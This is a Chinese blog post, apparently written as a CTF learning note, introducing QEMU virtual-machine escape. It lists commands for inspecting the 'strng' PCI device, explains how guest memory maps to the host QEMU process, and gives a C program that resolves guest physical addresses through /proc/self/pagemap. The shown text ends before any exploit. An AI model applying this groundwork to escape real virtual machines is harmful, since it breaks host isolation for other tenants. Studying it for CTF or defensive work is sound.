@@ -1,0 +1,2542 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <!-- shw2018 洪卫  modify 2019.08.15-->
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="初探qemu逃逸, xiaoxin">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
+    <meta name="description" content="[toc]
+常用指令sudo uname -m  出现i686代表是32位，出现x86_64代表64位。
+
+gcc -m32 -O0 souce_code -o bin_file   编译32位文件：
+
+gcc -m32 -O0 -stat">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google-site-verification" content="QLot9tUq5T-osxvFuAqTi1k4ZPWrio9O9znX-Z2Q3Ic">
+    <title>初探qemu逃逸 | xiaoxin</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/lightgallery/1.6.12/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <style type="text/css">
+        
+            
+            code[class*="language-"],
+            pre[class*="language-"] {
+                white-space: pre !important;
+            }
+
+        
+    </style>
+
+    <script src="https://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+    <body>
+
+        <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">xiaoxin</span>
+                </a>
+            </div>
+            
+
+
+<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/AV" class="waves-effect waves-light">
+            
+            <i class="fa fa-music"></i>
+            
+            <span>AV</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/galleries" class="waves-effect waves-light">
+            
+            <i class="fa fa-photo"></i>
+            
+            <span>Galleries</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-envelope"></i>
+            
+            <span>Contact</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>Friends</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+</ul> -->
+
+<!-- 支持二级菜单特性 小羊 Shinnosuke modify 2019.09.17  -->
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/" class="waves-effect waves-light">
+              
+                <i class="fa fa-home"></i>
+              
+              <span>Index</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/tags" class="waves-effect waves-light">
+              
+                <i class="fa fa-tags"></i>
+              
+              <span>Tags</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/categories" class="waves-effect waves-light">
+              
+                <i class="fa fa-bookmark"></i>
+              
+              <span>Categories</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/archives" class="waves-effect waves-light">
+              
+                <i class="fa fa-archive"></i>
+              
+              <span>Archives</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/AV" class="waves-effect waves-light">
+              
+                <i class="fa fa-music"></i>
+              
+              <span>AV</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/galleries" class="waves-effect waves-light">
+              
+                <i class="fa fa-photo"></i>
+              
+              <span>Galleries</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/about" class="waves-effect waves-light">
+              
+                <i class="fa fa-user-circle-o"></i>
+              
+              <span>About</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/contact" class="waves-effect waves-light">
+              
+                <i class="fa fa-envelope"></i>
+              
+              <span>Contact</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/friends" class="waves-effect waves-light">
+              
+                <i class="fa fa-address-book"></i>
+              
+              <span>Friends</span>
+            </a>
+
+            
+      </li>
+    
+
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">xiaoxin</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/AV" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-music"></i>
+                
+                AV
+            </a>
+        </li>
+        
+        <li>
+            <a href="/galleries" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-photo"></i>
+                
+                Galleries
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-envelope"></i>
+                
+                Contact
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                Friends
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/BlueSheepYang/bluesheepyang.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+
+   
+   
+<!-- 支持二级菜单特性 小羊 Shinnosuke shw2018 modify 2019.09.17  -->
+<!-- <ul class="menu-list mobile-menu-list">
+    
+        <li class="m-nav-item">
+                
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-home"></i>
+                        
+                        Index
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/tags" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-tags"></i>
+                        
+                        Tags
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/categories" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-bookmark"></i>
+                        
+                        Categories
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/archives" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-archive"></i>
+                        
+                        Archives
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/AV" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-music"></i>
+                        
+                        AV
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/galleries" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-photo"></i>
+                        
+                        Galleries
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/about" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-user-circle-o"></i>
+                        
+                        About
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/contact" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-envelope"></i>
+                        
+                        Contact
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/friends" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-address-book"></i>
+                        
+                        Friends
+                    </a>
+              
+            </li>
+        
+
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/BlueSheepYang/bluesheepyang.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul> -->
+
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/BlueSheepYang/bluesheepyang.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        初探qemu逃逸
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- shw2018 洪卫  modify 2019.08.15-->
+<!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/虚拟化/" class="post-category" target="_blank">
+                                虚拟化
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2021-06-23
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>Author:&nbsp;&nbsp;
+                    
+                        Shinnosuke
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
+                        6.3k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
+                        28 Min
+                    </div>
+                    
+                
+                
+                
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        <i class="fa fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv" ></span>
+    
+                
+
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>[toc]</p>
+<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">uname</span> -m  出现i686代表是32位，出现x86_64代表64位。
+
+gcc -m32 -O0 souce_code -o bin_file   编译32位文件：
+
+gcc -m32 -O0 -static -o souce binary
+
+<span class="token function">sudo</span> <span class="token function">scp</span> -P<span class="token punctuation">[</span>port<span class="token punctuation">]</span> <span class="token punctuation">[</span>filename<span class="token punctuation">]</span> <span class="token punctuation">[</span>hostname<span class="token punctuation">]</span>@<span class="token punctuation">[</span>ip<span class="token punctuation">]</span>:/home/ubuntu 传到虚拟机中：
+
+lspci -v -m -n -s 00:03.0  PCI 设备通过 VendorIDs 、 DeviceIDs 、以及 Class Codes 字段区分：
+lspci -v -m -s 00:03.0
+
+hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config  也可通过查看其 config 文件来查看设备的配置空间，数据都可以匹配上，如前两个字节 1234 为 vendor <span class="token function">id</span>
+
+lspci -v -s 00:03.0 -x   查看设备内存空间：
+
+<span class="token function">cat</span> /sys/devices/pci0000\:00/0000\:00\:03.0/resource  resource 文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：
+
+分析查看的函数流程：strng_class_init-<span class="token operator">></span>strng_instance_init-<span class="token operator">></span>pci_strng_realize-<span class="token operator">></span>分别却看MMIO和PMIO功能函数
+
+<span class="token function">cat</span> /proc/ioports 来查看各个设备对应的I/O端口
+<span class="token function">cat</span> /proc/iomem 查看其对应的I/O memory地址
+
+<span class="token function">gzip</span> initramfs-busybox-x86_64.cpio
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>qemu是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。我们在进行Iot研究的时候也经常用qemu来模拟固件。</p>
+<p>正因为 Qemu 是纯软件实现的，所有的指令都要经 Qemu 过一手，性能非常低，所以，在生产环境中，大多数的做法都是配合 KVM 来完成虚拟化工作，因为 <strong>KVM 是硬件辅助的虚拟化技术，主要负责比较繁琐的CPU和内存虚拟化，而Qemu则负责I/O虚拟化</strong>，两者合作各自发挥自身的优势，相得益彰。</p>
+<p>qemu出的问题比较多的地方都在设备模拟中。</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如 CPU 线程、I/O 线程等）对应qemu进程的一个线程。</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/0.png"></div>
+
+
+<p>qemu虚拟机内存所对应的真实内存结构如下：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/1.png"></div>
+
+<p>qemu进行会为虚拟机mmap分配出相应虚拟机申请大小的内存，用于给该虚拟机当作物理内存（在虚拟机进程中只会看到虚拟地址）。</p>
+<p>strng启动命令为：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">./qemu-system-x86_64 \
+-m 1G \
+-device strng \
+-hda my-disk.img \
+-hdb my-seed.img \
+-nographic \
+-L pc-bios/ \
+-enable-kvm \
+-device e1000,netdev<span class="token operator">=</span>net0 \
+-netdev user,id<span class="token operator">=</span>net0,hostfwd<span class="token operator">=</span>tcp::5555-:22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>qemu虚拟机对应的内存为1G，虚拟机启动后查看qemu的地址空间，可以看到存在一个大小为0x40000000内存空间，即为该虚拟机的物理内存。</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/2.png"></div>
+
+<p>那么我们在qemu申请内存空间，如何在宿主机找到这个内存呢？首先将qemu虚拟机中相应的虚拟地址转化成物理地址，该物理地址即为qemu进程为其分配出来的相应偏移，利用该地址加上偏移即是该虚拟地址对应在宿主机中的地址。</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;assert.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;inttypes.h></span></span>
+
+<span class="token macro property">#<span class="token directive keyword">define</span> PAGE_SHIFT  12</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> PAGE_SIZE   (1&lt;&lt; PAGE_SHIFT)</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> PFN_PRESENT (1ull&lt;&lt; 63)</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> PFN_PFN     ((1ull&lt;&lt; 55) - 1)</span>
+
+<span class="token keyword">int</span> fd<span class="token punctuation">;</span>
+
+uint32_t <span class="token function">page_offset</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+uint64_t <span class="token function">gva_to_gfn</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    uint64_t pme<span class="token punctuation">,</span> gfn<span class="token punctuation">;</span>
+    size_t offset<span class="token punctuation">;</span>
+    offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>addr <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">7</span><span class="token punctuation">;</span>
+    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> SEEK_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pme<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pme <span class="token operator">&amp;</span> PFN_PRESENT<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    gfn <span class="token operator">=</span> pme <span class="token operator">&amp;</span> PFN_PFN<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> gfn<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+uint64_t <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    uint64_t gfn <span class="token operator">=</span> <span class="token function">gva_to_gfn</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">assert</span><span class="token punctuation">(</span>gfn <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">(</span>gfn <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">page_offset</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    uint8_t<span class="token operator">*</span>ptr<span class="token punctuation">;</span>
+    uint64_t ptr_mem<span class="token punctuation">;</span>
+    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/pagemap"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token string">"Where am I?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ptr_mem <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your physical address is at 0x%"</span>PRIx64<span class="token string">"\n"</span><span class="token punctuation">,</span> ptr_mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
